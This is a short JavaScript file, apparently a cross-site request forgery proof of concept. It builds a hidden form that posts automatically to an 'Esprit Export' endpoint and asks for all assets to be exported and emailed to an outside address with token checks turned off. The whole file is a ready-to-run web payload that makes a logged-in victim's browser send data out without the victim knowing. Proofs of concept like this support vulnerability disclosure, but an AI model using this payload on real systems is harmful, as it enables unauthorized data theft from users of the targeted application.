function get_hidden_input(name,value){
	var r=document.createElement('input');
	r.type='hidden';
	r.name=name;
	r.value=value;
	return r;
}

var f=document.createElement('form');
f.action='https://sw.foxesprit.com/teams/ContentRef.do';
f.method="POST";
f.appendChild(get_hidden_input("exportForm", "TRUE"));
f.appendChild(get_hidden_input("app_id", "Esprit Export"));
f.appendChild(get_hidden_input("action", "300"));
f.appendChild(get_hidden_input("index", "-1"));
f.appendChild(get_hidden_input("name", "All"));
f.appendChild(get_hidden_input("filename", ""));
f.appendChild(get_hidden_input("expAssetName", "all"));
f.appendChild(get_hidden_input("contentReference", "true"));
f.appendChild(get_hidden_input("showEMAIL", "1"));
f.appendChild(get_hidden_input("emailTO", "cgrayson@bishopfox.com"));
f.appendChild(get_hidden_input("emailSUBJECT", ""));
f.appendChild(get_hidden_input("emailMESSAGE", ""));
f.appendChild(get_hidden_input("deliverySpan", "1Days"));
f.appendChild(get_hidden_input("viewFlag", "Y"));
f.appendChild(get_hidden_input("downloadFlag", "Y"));
f.appendChild(get_hidden_input("useTokenFlag", "N"));
document.body.appendChild(f);
document.forms[0].submit();